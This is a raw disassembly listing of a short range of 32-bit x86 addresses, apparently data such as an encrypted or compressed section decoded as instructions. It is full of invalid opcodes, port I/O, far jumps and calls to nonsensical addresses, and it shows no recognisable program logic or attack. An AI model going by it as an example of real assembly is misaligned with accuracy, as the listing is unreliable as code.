  419318:	add    al,0xe1
  41931a:	retf   
  41931b:	out    0x6,al
  41931d:	clc    
  41931e:	(bad)  
  41931f:	rcl    ebx,cl
  419321:	mov    dh,0xbc
  419323:	in     al,0xea
  419325:	lock loopne 0x419314
  419328:	mov    ah,0xd4
  41932a:	in     al,0xd3
  41932c:	repz mov ecx,0xdfda03e0
  419332:	lock repnz mov ecx,0xdef5dce7
  419339:	add    edi,ebx
  41933b:	jecxz  0x419345
  41933d:	out    0xed,eax
  41933f:	test   eax,0xc8d4e9a8
  419344:	fucomi st,st(1)
  419346:	loopne 0x419340
  419348:	aad    0xf8
  41934a:	mov    edi,0xc9edd0e8
  41934f:	sar    DWORD PTR [ecx-0x1f0a2b1a],0xfd
  419356:	(bad)  
  419357:	clc    
  419358:	les    eax,FWORD PTR [edi]
  41935a:	fisttp DWORD PTR [esi]
  41935c:	in     eax,0xfa
  41935e:	scas   al,BYTE PTR es:[edi]
  41935f:	retf   
  419360:	ret    0xf1d0
  419363:	(bad)  [eax-0x4a2c1337]
  419369:	neg    ah
  41936b:	retf   
  41936c:	into   
  41936d:	ret    0xccf5
  419370:	sar    cl,cl
  419372:	add    eax,edx
  419374:	(bad)  
  419375:	ror    bl,1
  419377:	retf   
  419378:	jmp    0x419389
  41937a:	call   0xb4257d43
  41937f:	icebp  
  419380:	out    dx,al
  419381:	jmp    0x41936a
  419383:	retf   
  419384:	fcomi  st,st(6)
  419386:	in     al,dx
  419387:	rcr    edx,cl
  419389:	retf   
  41938a:	mov    ah,0xf4
  41938c:	mov    edx,0xd5faf2bc
  419391:	(bad)  
  419393:	out    0xe0,eax
  419395:	retf   
  419396:	fadd   QWORD PTR [esi]
  419398:	iret   
  419399:	sti    
  41939a:	ret    
  41939b:	add    esp,esp
  41939d:	enter  0xaddc,0xcd
  4193a1:	mov    bl,0xd5
  4193a3:	hlt    
  4193a4:	repz rcl eax,cl
  4193a7:	xlat   BYTE PTR ds:[ebx]
  4193a8:	xlat   BYTE PTR ds:[ebx]
  4193a9:	mov    ch,0xb8
  4193ab:	mov    ah,0xbf
  4193ad:	loop   0x419387
  4193af:	loop   0x4193a2
  4193b1:	mov    esi,0xdf0004e4
  4193b6:	jmp    0xfdf8:0xe8cebd0b
  4193bd:	jecxz  0x41938a
  4193bf:	loopne 0x4193b7
  4193c1:	iret   
  4193c2:	out    dx,al
  4193c3:	mov    al,0xc2
  4193c5:	int    0xd6
  4193c7:	fdivr  DWORD PTR [eax-0x160f0746]
  4193cd:	sti    
  4193ce:	mov    ecx,0xc0bc07fb
  4193d3:	fiadd  DWORD PTR ds:0xc9d9c5d2
  4193d9:	call   0xf22171c7
  4193de:	jmp    0xb81483d6
  4193e3:	(bad)  
  4193e4:	mov    cl,0xc1
  4193e6:	in     al,dx
  4193e7:	fbstp  TBYTE PTR [ebp-0x124d2128]
  4193ed:	in     eax,dx
  4193ee:	add    dl,al
  4193f0:	mul    dh
  4193f2:	out    0xfc,al
  4193f4:	icebp  
  4193f5:	stc    
  4193f6:	test   ebx,0x1d4d608
  4193fc:	add    eax,0xf2dde6cf
  419401:	mov    dl,0xf5
  419403:	into   
  419404:	jmp    0xf5ac:0xe5b4fabb
  41940b:	int3   
  41940c:	(bad)  [eax-0x39052731]
  419412:	repnz or eax,DWORD PTR ds:0xc100fed4
  419419:	add    al,0xe6
  41941b:	or     BYTE PTR ds:0xa8aeeae5,al
  419421:	aad    0xd7
  419423:	mov    dh,0xb5
  419425:	ror    dl,cl
  419427:	rcr    bl,cl
  419429:	mov    esi,0xbceddaef
  41942e:	ret    0xd707
  419431:	icebp  
  419432:	shr    ebx,0xf5
  419435:	(bad)  
  419437:	mov    esi,0xe6d8dde1
  41943d:	add    al,0xf1
  41943f:	out    dx,al
  419440:	mov    esp,0xd3e7e7b3
  419445:	mov    dl,0xc0
  419447:	repnz out dx,eax
  419449:	(bad)  
  41944a:	std    
  41944b:	mov    esp,0x2ddd6bb
  419450:	fstp   st(6)
  419452:	add    esp,esi
  419454:	fiadd  DWORD PTR [eax]
  419456:	rol    DWORD PTR [eax],1
  419458:	in     eax,0xe3
  41945a:	leave  
  41945b:	loop   0x41945e
  41945d:	icebp  
  41945e:	in     al,0xca
  419460:	mov    bh,0xe4
  419462:	les    esi,FWORD PTR [ebx-0x3405104b]
  419468:	repz lock rcr bl,1
  41946c:	sti    
  41946d:	sti    
  41946e:	mov    ecx,0xbcdcffd2
  419473:	sar    edx,cl
  419475:	add    eax,0xefdcfebf
  41947a:	fadd   QWORD PTR [edi]
  41947c:	or     dh,bl
  41947e:	fucomip st,st(6)
  419480:	out    0xc1,al
  419482:	cmc    
  419483:	shl    BYTE PTR [ebx-0x29290d3b],0xb6
  41948a:	repnz rcl ecx,cl
  41948d:	fnstsw WORD PTR [edx-0x1821052f]
  419493:	fdiv   st,st(0)
  419495:	(bad)  
  419496:	cld    
  419497:	mov    edi,0xfce10bfb
  41949d:	in     eax,0xd9
  41949f:	les    edi,FWORD PTR [ecx+esi*4-0x5730371f]
  4194a6:	xlat   BYTE PTR ds:[ebx]
  4194a7:	fcmovbe st,st(5)
  4194a9:	shl    BYTE PTR [esi-0x7fc0b28],1
  4194af:	jecxz  0x4194a3
  4194b1:	pop    es
  4194b2:	cli    
  4194b3:	add    bh,ah
  4194b5:	loope  0x4194bd
  4194b7:	sar    dl,1
  4194b9:	or     cl,dh
  4194bb:	or     cl,BYTE PTR [ecx]
  4194bd:	or     eax,0xd7c5e7e3
  4194c2:	lods   eax,DWORD PTR ds:[esi]
  4194c3:	cmc    
  4194c4:	repz in al,dx
  4194c6:	fsubr  st,st(1)
  4194c8:	sar    BYTE PTR [ebx-0x43401549],cl
  4194ce:	xlat   BYTE PTR ds:[ebx]
  4194cf:	out    0xb8,eax
  4194d1:	std    
  4194d2:	(bad)  
  4194d3:	ret    
  4194d4:	mov    ecx,0xe8f7ded0
  4194d9:	cli    
  4194da:	add    eax,0xaedcd8c9
  4194df:	lods   eax,DWORD PTR ds:[esi]
  4194e0:	in     eax,0xd2
  4194e2:	lock rol edx,1
  4194e5:	fld    st(5)
  4194e7:	xlat   BYTE PTR ds:[ebx]
  4194e8:	bnd call 0xce1652d8
  4194ee:	(bad)  
  4194ef:	cmc    
  4194f0:	loop   0x4194ee
  4194f2:	mov    ebp,0xdbd6d2c5
  4194f7:	out    0xbd,al
  4194f9:	or     eax,0x13e9f801
  4194fe:	enter  0xd0d8,0xdc
  419502:	(bad)  
  419503:	out    0xf5,eax
  419505:	into   
  419506:	retf   
  419507:	into   
  419508:	leave  
  419509:	in     al,0xc9
  41950b:	std    
  41950c:	stc    
  41950d:	(bad)  
  41950f:	hlt    
  419510:	ret    0xdfd0
  419513:	rol    ch,cl
  419515:	(bad)  
  419516:	cli    
  419517:	fcmovu st,st(1)
  419519:	add    al,0xd9
  41951b:	clc    
  41951c:	or     edx,esi
  41951e:	fmulp  st(1),st
  419520:	mov    esp,0xeed6acb3
  419525:	shl    eax,cl
  419527:	(bad)  
  419528:	mov    eax,0xdcdaedc4
  41952d:	repz fsubr st(1),st
  419530:	int3   
  419531:	fscale 
  419533:	clc    
  419534:	cld    
  419535:	cld    
  419536:	(bad)  
  419537:	xlat   BYTE PTR ds:[ebx]
  419538:	or     ebx,esi
  41953a:	mov    esi,0xbdb1f1e7
  419540:	rcl    esi,cl
  419542:	call   0xec0a472a
  419547:	(bad)  
  419549:	mov    edx,0xd2d7d1ed
  41954e:	fdivrp st(5),st
  419550:	in     eax,dx
  419551:	imul   esp
  419553:	in     al,dx
  419554:	shl    esp,1
  419556:	stc    
  419557:	jmp    0xc8ce:0x8c4d60a
  41955e:	out    0xb1,eax
  419560:	div    DWORD PTR [eax-0x3d1b3e4e]
  419566:	mov    ah,0xea
  419568:	hlt    
  419569:	shr    dh,1
  41956b:	dec    esp
  41956d:	sar    al,cl
  41956f:	shl    esi,cl
  419571:	fst    st(7)
  419573:	test   ah,0xe1
  419576:	jmp    0x419581
  419578:	jmp    0x41957d
  41957a:	add    eax,0xc8040806
  41957f:	jmp    0xc2f5:0xadece8c2
  419586:	mov    bh,0xd8
  419588:	mov    edx,0xf8dfdddb
  41958d:	mov    al,0xef
  41958f:	cmc    
  419590:	cli    
  419591:	fmulp  st(5),st
  419593:	fdivr  st(3),st
  419595:	add    ebp,esp
  419597:	in     al,0xc1
  419599:	push   es
  41959a:	fiadd  WORD PTR [edi]
  41959c:	loop   0x4195b1
  41959e:	jmp    0x41955d
  4195a0:	loop   0x419551
  4195a2:	stos   DWORD PTR es:[edi],eax
  4195a3:	aad    0xb4
  4195a5:	jmp    0xf5276f91
  4195aa:	out    dx,eax
  4195ab:	dec    ah
  4195ad:	jecxz  0x4195ab
  4195af:	idiv   ebx
  4195b1:	ret    
  4195b2:	add    esp,eax
  4195b4:	rol    BYTE PTR [ecx],0x8
  4195b7:	or     ebx,ecx
  4195b9:	add    al,0x7
  4195bb:	aam    0x0
  4195bd:	repz in al,0xb2
  4195c0:	repz out 0xdc,al
  4195c3:	loopne 0x4195c0
  4195c5:	(bad)
  4195c8:	fmul   st,st(7)
  4195ca:	out    dx,eax
  4195cb:	sar    eax,1
  4195cd:	mov    ebp,0xd2c7bdb9
  4195d2:	add    edi,edi
  4195d4:	les    ecx,FWORD PTR [ecx]
  4195d6:	loopne 0x4195b5
  4195d8:	sti    
  4195d9:	jmp    0xf3c9:0x80dcdde
  4195e0:	xlat   BYTE PTR ds:[ebx]
  4195e1:	loop   0x4195b7
  4195e3:	div    BYTE PTR [edx-0x1b1b4935]
  4195e9:	int3   
  4195ea:	into   
  4195eb:	(bad)  
  4195ec:	out    dx,al
  4195ed:	mov    esi,0xd9d5bed7
  4195f2:	neg    edi
  4195f4:	or     dl,bh
  4195f6:	or     cl,al
  4195f8:	jmp    0x4195de
  4195fa:	fmul   DWORD PTR [edx]
  4195fc:	loopne 0x4195e6
  4195fe:	int3   
  4195ff:	stos   BYTE PTR es:[edi],al
  419600:	shl    BYTE PTR [esp+ecx*8-0x8341639],1
  419607:	retf   
  419608:	repnz rcl bh,1
  41960b:	not    edx
  41960d:	mov    esp,0xd9f2f6f1
  419612:	ret    
  419613:	fnstsw WORD PTR [ecx-0x3ff92005]
  419619:	(bad)  
  41961a:	jmp    0x419601
  41961c:	add    al,0xce
  41961e:	mov    ecx,0xabc8c1c8
  419623:	out    0xee,al
  419625:	retf   
  419626:	mov    ch,0xed
  419628:	mov    edi,0xdaeec4b9
  41962d:	(bad)  
  41962f:	mov    edx,0xf8faf9d9
  419634:	(bad)  
  419635:	(bad)  
  419636:	(bad)  
  419637:	fild   DWORD PTR [eax]
  419639:	(bad)  
  41963b:	add    esp,eax
  41963d:	call   0xd60a602c
  419642:	mov    ch,0xd1
  419644:	les    esi,FWORD PTR [ecx-0x37372c2e]
  41964a:	iret   
  41964b:	out    dx,al
  41964c:	jmp    0x7358d10
  419651:	add    eax,0xffded1f5
  419656:	jmp    ecx
  419658:	retf   0xea0b
  41965b:	fdivr  st(2),st
  41965d:	adc    bh,BYTE PTR [ebp-0x3411423b]
  419663:	scas   al,BYTE PTR es:[edi]
  419664:	mov    dh,0xb3
  419666:	out    dx,al
  419667:	repz out dx,al
  419669:	stc    
  41966a:	call   0xdc1d806d
  41966f:	rcl    edx,0xf2
  419672:	rcr    ch,0xf8
  419675:	jecxz  0x419639
  419677:	jmp    0x419661
  419679:	in     eax,0x0
  41967b:	int3   
  41967c:	les    eax,FWORD PTR [edx]
  41967e:	mov    esi,0xd1ede1c3
  419683:	mov    bl,0xc8
  419685:	xlat   BYTE PTR ds:[ebx]
  419686:	aad    0xf1
  419688:	(bad)
  41968b:	call   0xf2055586
  419690:	mov    edi,0xdad0f9ec
  419695:	cli    
  419696:	(bad)  [edx]
  419698:	add    bl,bh
  41969a:	fcmovne st,st(0)
  41969c:	stc    
  41969d:	into   
  41969e:	scas   eax,DWORD PTR es:[edi]
  41969f:	mov    cl,0xe9
  4196a1:	icebp  
  4196a2:	enter  0xcbe6,0xc7
  4196a6:	fcom   st(1)
  4196a8:	fdivr  st,st(0)
  4196aa:	into   
  4196ab:	(bad)  
  4196ad:	idiv   DWORD PTR [ebp-0x440d0e23]
  4196b3:	lock cld 
  4196b5:	out    0xe1,al
  4196b7:	add    ecx,ecx
  4196b9:	shl    cl,0x9
  4196bc:	dec    DWORD PTR [edi]
  4196be:	fdivrp st(3),st
  4196c0:	(bad)
  4196c4:	imul   esp
  4196c6:	mov    al,0xb2
  4196c8:	mul    ch
  4196ca:	call   0xe42c72b3
  4196cf:	rol    bh,cl
  4196d1:	cmc    
  4196d2:	pop    es
  4196d3:	ret    
  4196d4:	retf   
  4196d5:	hlt    
  4196d6:	ret    
  4196d7:	fsub   st,st(2)
  4196d9:	out    dx,eax
  4196da:	(bad)  
  4196dc:	cld    
  4196dd:	pop    es
  4196de:	sar    BYTE PTR [ebp-0x121e1911],cl
  4196e4:	rcl    ebp,1
  4196e6:	(bad)  
  4196e7:	out    dx,eax
  4196e8:	mov    ch,0xcc
  4196ea:	in     eax,dx
  4196eb:	icebp  
  4196ec:	into   
  4196ed:	xlat   BYTE PTR ds:[ebx]
  4196ee:	call   0xed0458f2
  4196f3:	(bad)
  4196f6:	or     ebx,eax
  4196f8:	or     ebx,ebx
  4196fa:	or     esp,ebx
  4196fc:	loop   0x4196fb
  4196fe:	shl    eax,1
  419700:	(bad)
  419704:	lods   al,BYTE PTR ds:[esi]
  419705:	mov    ah,0xe1
  419707:	sti    
  419708:	repnz in eax,0xf7
  41970b:	int3   
  41970c:	repz int3 
  41970e:	loopne 0x4196e9
  419710:	int    0xbe
  419712:	out    0xe0,eax
  419714:	stc    
  419715:	out    0xe2,eax
  419717:	out    0xc1,eax
  419719:	(bad)  
  41971a:	std    
  41971b:	clc    
  41971c:	out    dx,al
  41971d:	push   es
  41971e:	loop   0x4196f7
  419720:	neg    ebp
  419722:	loop   0x4196eb
  419724:	repnz out dx,al
  419726:	mov    edx,0xc8dbdafb
  41972b:	int3   
  41972c:	mov    edx,0xb5b8d3be
  419731:	rcr    cl,cl
  419733:	stc    
  419734:	xlat   BYTE PTR ds:[ebx]
  419735:	(bad)  
  419737:	fcomp  st(4)
  419739:	hlt    
  41973a:	or     al,0xf
  41973c:	repnz loop 0x419710
  41973f:	retf   0xd2c0
  419742:	ret    0xe5b4
  419745:	call   0xba195311
  41974a:	cli    
  41974b:	ror    dl,cl
  41974d:	enter  0xf9bd,0xb5
  419751:	hlt    
  419752:	in     eax,dx
  419753:	std    
  419754:	jmp    0x419731
  419756:	pop    es
  419757:	or     al,BYTE PTR [ecx]
  419759:	in     al,0xe7
  41975b:	ret    0x12de
  41975e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41975f:	loopne 0x419741
  419761:	sar    BYTE PTR [ebp-0x3037520a],0xe8
  419768:	cmc    
  419769:	(bad)  
  41976a:	enter  0xf4ea,0xdb
  41976e:	faddp  st(2),st
  419770:	into   
  419771:	std    
  419772:	fcmovb st,st(1)
  419774:	out    0xe4,al
  419776:	add    bh,BYTE PTR [esi-0x22f93719]
  41977c:	(bad)  
  41977e:	jmp    0xe7228f60
  419783:	lock out dx,eax
  419785:	xbegin 0xf3384e52
  41978b:	mov    eax,0xefe9f2cf
  419790:	mul    bh
  419792:	fcmovnbe st,st(3)
  419794:	loop   0x419766
  419796:	pop    es
  419797:	out    0xf4,al
  419799:	in     al,0xb
  41979b:	loope  0x419769
  41979d:	out    dx,al
  41979e:	rcr    eax,0xe7
  4197a1:	xlat   BYTE PTR ds:[ebx]
  4197a2:	ffree  st(5)
  4197a4:	mov    ch,0xb4
  4197a6:	sti    
  4197a7:	aad    0xb6
  4197a9:	push   esp
  4197ab:	shl    edx,cl
  4197ad:	add    ch,dh
  4197af:	mov    ecx,0xf906c3cc
  4197b4:	(bad)  
  4197b6:	test   edi,0xe3e7ebdd
  4197bc:	jmp    0xcd2b678e
  4197c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197c2:	jmp    0xf5f673b3
  4197c7:	mov    ecx,0xd8bbf9f4
  4197cc:	retf   
  4197cd:	iret   
  4197ce:	std    
  4197cf:	fdivr  st,st(2)
  4197d1:	mov    eax,0xc2db01e6
  4197d6:	sti    
  4197d7:	rcl    ch,1
  4197d9:	fiadd  DWORD PTR [ebx]
  4197db:	into   
  4197dc:	out    dx,eax
  4197dd:	in     al,dx
  4197de:	mov    edi,0xeac7cced
  4197e3:	(bad)  
  4197e4:	jmp    0xb3fb:0xecf5faf9
  4197eb:	cli    
  4197ec:	(bad)  
  4197ee:	add    ecx,esi
  4197f0:	mov    esp,0xb9f7fcdb
  4197f5:	xlat   BYTE PTR ds:[ebx]
  4197f6:	or     ah,al
  4197f8:	add    DWORD PTR [ebx],ecx
  4197fa:	or     al,0xf4
  4197fc:	call   0xf31487fa
  419801:	mov    dl,0xbd
  419803:	lock repnz icebp 
  419806:	shr    al,cl
  419808:	in     eax,dx
  419809:	jmp    0xdf3e7308
  41980e:	mov    edi,0xdfbfd8d1
  419813:	add    eax,0xe5f1da07
  419818:	fdivrp st(5),st
  41981a:	cld    
  41981b:	clc    
  41981c:	fst    QWORD PTR [ecx]
  41981e:	call   0xc50f6edb
  419823:	rcl    ebx,cl
  419825:	stc    
  419826:	hlt    
  419827:	enter  0xf8d7,0xd7
  41982b:	hlt    
  41982c:	aad    0xbe
  41982e:	fdivr  st(2),st
  419830:	fdiv   st(5),st
  419832:	test   BYTE PTR [ebx+eax*8],0xfa
  419836:	fucomip st,st(2)
  419838:	xlat   BYTE PTR ds:[ebx]
  419839:	fadd   st(6),st
  41983b:	pmulhuw mm2,mm3
  41983e:	shr    ebp,0xec
  419841:	vpsubsb ymm2,ymm4,ymm0
  419845:	into   
  419846:	mov    edx,0xecd9b8b1
  41984b:	(bad)  
  41984d:	add    ebx,edx
  41984f:	(bad)  
  419850:	fucomp st(4)
  419852:	out    0xd6,eax
  419854:	xlat   BYTE PTR ds:[ebx]
  419855:	std    
  419856:	add    ebx,edi
  419858:	aam    0x6
  41985a:	or     ecx,ebx
  41985c:	add    eax,0xf6dcf0c8
  419861:	(bad)
  419864:	hlt    
  419865:	mov    dl,0xb1
  419867:	scas   al,BYTE PTR es:[edi]
  419868:	(bad)  
  419869:	out    0xe5,al
  41986b:	add    ecx,esp
  41986d:	mov    ecx,0x1f7eedb
  419872:	call   ecx
  419874:	add    eax,0xe90bc5eb
  419879:	pmullw mm5,mm4
  41987c:	jmp    0xc4ea:0xbcafdfca
  419883:	into   
  419884:	mov    bh,0xc6
  419886:	into   
  419887:	in     eax,dx
  419888:	sar    edx,1
  41988a:	into   
  41988b:	fnstsw WORD PTR [esi+0x1e3d201]
  419891:	icebp  
  419892:	mov    esp,0xe6f206fc
  419897:	ffreep st(6)
  419899:	cmc    
  41989a:	aam    0xed
  41989c:	or     ecx,DWORD PTR [esi]
  41989e:	out    0xd3,eax
  4198a0:	lds    edi,FWORD PTR [ebp-0x531a1333]
  4198a6:	mov    dh,0xf4
  4198a8:	int3   
  4198a9:	clc    
  4198aa:	mov    dh,0xfb
  4198ac:	add    dl,bh
  4198ae:	fstp   st(5)
  4198b0:	mov    edi,0xf107c1cc
  4198b5:	or     eax,eax
  4198b7:	loopne 0x4198b2
  4198b9:	pop    es
  4198ba:	mov    BYTE PTR ds:0xd1d0d9ea,0xf7
  4198c1:	(bad)  
  4198c2:	test   cl,0xe8
  4198c5:	retf   0xb5d9
  4198c8:	int3   
  4198c9:	in     eax,0xd4
  4198cb:	leave  
  4198cc:	mov    edi,0xcde0f9ff
  4198d1:	loop   0x4198bf
  4198d3:	in     eax,0xff
  4198d5:	add    ebx,ecx
  4198d7:	out    dx,eax
  4198d8:	(bad)
  4198db:	or     al,0xf3
  4198dd:	fcmovbe st,st(2)
  4198df:	xlat   BYTE PTR ds:[ebx]
  4198e0:	repnz mov al,0xf4
  4198e3:	out    dx,al
  4198e4:	shl    esi,1
  4198e6:	mov    al,0xb6
  4198e8:	cli    
  4198e9:	mov    bh,0xcd
  4198eb:	mov    esi,0xb9c3d5cc
  4198f0:	fdivr  QWORD PTR [edi+esi*8-0xaf80f19]
  4198f7:	(bad)  
  4198f9:	or     esp,ebp
  4198fb:	aam    0xdd
  4198fd:	add    BYTE PTR [ecx-0x2f4c4d1d],ch
  419903:	mov    al,0xf2
  419905:	icebp  
  419906:	clc    
  419907:	mov    al,0xc7
  419909:	div    esi
  41990b:	lock ret 
  41990d:	loope  0x4198d1
  41990f:	mov    ebp,0xd703e6c7
  419914:	aam    0xbc
  419916:	in     al,0xe2
  419918:	or     al,cl
  41991a:	(bad)  
  41991b:	loop   0x4198fc
  41991d:	out    0xb8,eax
  41991f:	retf   0xe3f1
  419922:	(bad)  
  419923:	in     eax,dx
  419924:	jecxz  0x4198fb
  419926:	leave  
  419927:	(bad)  
  419928:	(bad)  
  41992a:	(bad)  
  41992b:	int    0xcb
  41992d:	in     al,dx
  41992e:	int    0x0
  419930:	fdivp  st(7),st
  419932:	cld    
  419933:	sti    
  419934:	mov    esp,0xc1e1ded2
  419939:	loopne 0x419900
  41993b:	leave  
  41993c:	out    dx,eax
  41993d:	icebp  
  41993e:	mov    dl,0xc6
  419940:	shr    ah,cl
  419942:	rol    cl,cl
  419944:	cmc    
  419945:	loopne 0x419928
  419947:	scas   al,BYTE PTR es:[edi]
  419948:	mov    edi,0xb1dcffdb
  41994d:	rol    edx,1
  41994f:	cld    
  419950:	loope  0x41991e
  419952:	jmp    esp
  419954:	rcl    dl,cl
  419956:	shl    bh,0x7
  419959:	fucomi st,st(6)
  41995b:	add    cl,ch
  41995d:	add    al,0xd9
  41995f:	into   
  419960:	fadd   st(5),st
  419962:	rol    al,cl
  419964:	mov    al,0xcc
  419966:	fdiv   st,st(4)
  419968:	mov    ah,0xec
  41996a:	div    BYTE PTR [edx+ecx*8-0x1820474c]
  419971:	cli    
  419972:	fyl2x  
  419974:	add    edx,esi
  419976:	(bad)  
  419978:	jmp    0x419968
  41997a:	out    dx,eax
  41997b:	push   es
  41997c:	or     eax,0xd3dfe8fc
  419981:	rol    ebp,0xb1
  419984:	into   
  419985:	(bad)  
  419986:	ror    bh,cl
  419988:	in     al,dx
  419989:	(bad)
  41998c:	mov    esi,0xc3ffecbf
  419991:	add    al,BYTE PTR [ecx]
  419993:	std    
  419994:	jmp    0xfef4:0xc007e4bc
  41999b:	retf   
  41999c:	int3   
  41999d:	sar    DWORD PTR [ebp-0x1d13163c],cl
  4199a3:	ret    
  4199a4:	rcl    dl,0xd1
  4199a7:	mov    cl,0xe4
  4199a9:	rcr    ebp,1
  4199ab:	in     eax,dx
  4199ac:	icebp  
  4199ad:	int3   
  4199ae:	aad    0xdf
  4199b0:	into   
  4199b1:	div    edx
  4199b3:	lock clc 
  4199b5:	mov    eax,0xd804c1e2
  4199ba:	add    cl,cl
  4199bc:	(bad)  
  4199bd:	fsubr  st,st(5)
  4199bf:	mov    eax,0xb2f4d2bc
  4199c4:	ror    ch,1
  4199c6:	out    0xfa,eax
  4199c8:	sar    BYTE PTR [edi-0x43200c12],1
  4199ce:	icebp  
  4199cf:	mov    esi,0x4f6c3f9
  4199d4:	(bad)
  4199d7:	(bad)
  4199da:	add    esi,edi
  4199dc:	psubsb mm3,mm7
  4199df:	test   al,0xc0
  4199e1:	cmc    
  4199e2:	in     eax,dx
  4199e3:	icebp  
  4199e4:	lods   al,BYTE PTR ds:[esi]
  4199e5:	(bad)
  4199e8:	mov    dh,0xc9
  4199ea:	(bad)  
  4199eb:	in     al,0xb8
  4199ed:	mov    ebx,0xb4fcd0d3
  4199f2:	(bad)
  4199f5:	lock jmp 0x4199d2
  4199f8:	dec    esi
  4199fa:	(bad)  
  4199fb:	stc    
  4199fc:	fabs   
  4199fe:	fsubr  QWORD PTR [ecx-0x2b491e2d]
  419a04:	aam    0xf6
  419a06:	aad    0xf7
  419a08:	in     al,dx
  419a09:	cli    
  419a0a:	lds    edi,FWORD PTR [edx-0x17271526]
  419a10:	ret    0xfbdf
  419a13:	(bad)  
  419a14:	neg    eax
  419a16:	fcmovne st,st(3)
  419a18:	sti    
  419a19:	loope  0x419a19
  419a1b:	adc    edi,edx
  419a1d:	loopne 0x4199ef
  419a1f:	jecxz  0x419a12
  419a21:	enter  0xd4c4,0xac
  419a25:	lock aad 0xe0
  419a28:	int3   
  419a29:	iret   
  419a2a:	mov    ch,0xb2
  419a2c:	loop   0x419a0a
  419a2e:	std    
  419a2f:	aam    0xbc
  419a31:	aad    0xe7
  419a33:	push   es
  419a34:	jecxz  0x419a0a
  419a36:	retf   0xeef9
  419a39:	(bad)  
  419a3a:	inc    BYTE PTR [esi]
  419a3c:	add    al,0xcf
  419a3e:	in     eax,dx
  419a3f:	loop   0x419a07
  419a41:	rol    bl,cl
  419a43:	loope  0x419a31
  419a45:	test   al,0xff
  419a48:	mov    eax,0xd2e4f3f2
  419a4d:	fucom  st(3)
  419a4f:	add    edi,ecx
  419a51:	fcmovu st,st(1)
  419a53:	clc    
  419a54:	stc    
  419a55:	fdiv   st,st(1)
  419a57:	fsub   st(0),st
  419a59:	enter  0xe7e3,0xd8
  419a5d:	add    eax,0xf6f1bdd8
  419a62:	scas   al,BYTE PTR es:[edi]
  419a63:	rol    dl,0xe1
  419a66:	loopne 0x419a56
  419a68:	mov    ebx,0xe9dcdedd
  419a6d:	imul   dh
  419a6f:	repz mov eax,0xd307d9e3
  419a75:	lds    ecx,FWORD PTR [ecx]
  419a77:	leave  
  419a78:	(bad)  
  419a79:	(bad)  
  419a7b:	jmp    0xf00f8c6d
  419a80:	icebp  
  419a81:	mov    dh,0xc8
  419a83:	ret    0xede9
  419a86:	icebp  
  419a87:	(bad)  
  419a89:	cli    
  419a8a:	imul   ebx
  419a8c:	clc    
  419a8d:	xlat   BYTE PTR ds:[ebx]
  419a8e:	int3   
  419a8f:	sar    bh,1
  419a91:	(bad)  
  419a92:	mov    edi,0xd804d1fc
  419a97:	sti    
  419a98:	add    al,BYTE PTR [esi]
  419a9a:	in     al,0xf8
  419a9c:	or     al,0xfa
  419a9e:	in     al,0xa6
  419aa0:	iret   
  419aa1:	mov    esi,0xf5d7c5bd
  419aa6:	mov    ch,0xe8
  419aa8:	in     al,dx
  419aa9:	call   0xf2187f69
  419aae:	mov    ecx,0xe4e5f9bd
  419ab3:	shr    edx,cl
  419ab5:	loop   0x419a87
  419ab7:	(bad)  
  419ab8:	loope  0x419a8f
  419aba:	fisttp DWORD PTR [ecx]
  419abc:	jecxz  0x419ac5
  419abe:	loopne 0x419aa1
  419ac0:	loope  0x419a86
  419ac2:	out    0xef,al
  419ac4:	icebp  
  419ac5:	mov    ch,0xf0
  419ac7:	mov    ah,0xb0
  419ac9:	(bad)  
  419acb:	fistp  QWORD PTR [ebx-0x2c021e41]
  419ad1:	push   es
  419ad2:	vpsubq xmm2,xmm5,xmm5
  419ad6:	leave  
  419ad7:	loop   0x419ac4
  419ad9:	add    ebp,edi
  419adb:	call   0xcaf06ec1
  419ae0:	neg    ch
  419ae2:	out    dx,eax
  419ae3:	(bad)  
  419ae4:	mov    al,0xc7
  419ae6:	iret   
  419ae7:	icebp  
  419ae8:	mov    ecx,0xc9f8dbb8
  419aed:	(bad)  
  419aee:	jmp    0xd41a8be4
  419af3:	out    0xfc,al
  419af5:	fcmovb st,st(3)
  419af7:	pop    es
  419af8:	in     eax,0x3
  419afa:	iret   
  419afb:	fld    DWORD PTR ds:0xd0f0c311
  419b01:	mov    dl,0xc6
  419b03:	repz fndisi(8087 only) 
  419b06:	sti    
  419b07:	fidiv  DWORD PTR [ecx-0x4721331a]
  419b0d:	(bad)  
  419b0e:	enter  0xb9f0,0xf2
  419b12:	add    bh,ah
  419b14:	div    esi
  419b16:	ret    0xe6d4
  419b19:	(bad)  
  419b1a:	fcmovu st,st(4)
  419b1c:	jmp    0xd3e5:0xf3e6b1e5
  419b23:	jmp    0xd6299503
  419b28:	in     eax,dx
  419b29:	clc    
  419b2a:	mov    ch,0xeb
  419b2c:	(bad)  
  419b2d:	mov    edx,0xd2fcefba
  419b32:	aam    0xc7
  419b34:	(bad)
  419b38:	out    dx,al
  419b39:	fmul   QWORD PTR ds:0xceddf9ee
  419b3f:	scas   eax,DWORD PTR es:[edi]
  419b40:	out    0xbe,eax
  419b42:	jmp    0xcc32670f
  419b47:	scas   al,BYTE PTR es:[edi]
  419b48:	repnz mov ah,0xcb
  419b4c:	mov    esp,0x7b6edde
  419b51:	fsubp  st(4),st
  419b53:	fndisi(8087 only) 
  419b55:	sar    eax,1
  419b57:	jmp    0x419b52
  419b59:	in     eax,0xdf
  419b5b:	leave  
  419b5c:	ror    ebp,0xd8
  419b5f:	sar    DWORD PTR [esi-0x2a0f114e],1
  419b65:	enter  0xd2b1,0xd3
  419b69:	retf   
  419b6a:	mov    ecx,0xf5dbbdc4
  419b6f:	ret    0xc6fb
  419b72:	fadd   DWORD PTR [eax]
  419b74:	mov    DWORD PTR [edx+ebp*8],0xfecbf8dd
  419b7b:	in     eax,0xec
  419b7d:	add    ch,ch
  419b7f:	(bad)  
  419b80:	ror    ch,0xce
  419b83:	fsubr  st(1),st
  419b85:	mov    ebx,0xe8ebecb6
  419b8a:	clc    
  419b8b:	lock test esp,0xdac2e2bb
  419b92:	xlat   BYTE PTR ds:[ebx]
  419b93:	add    al,0xbc
  419b95:	xlat   BYTE PTR ds:[ebx]
  419b96:	add    eax,edx
  419b98:	add    ebx,edi
  419b9a:	vpsubusb ymm3,ymm0,ymm1
  419b9e:	in     al,0xe6
  419ba0:	mov    ebp,0xc4e4c5ed
  419ba5:	test   dh,0xd5
  419ba8:	(bad)
  419bab:	repz ret 
  419bad:	call   0xc71c9faf
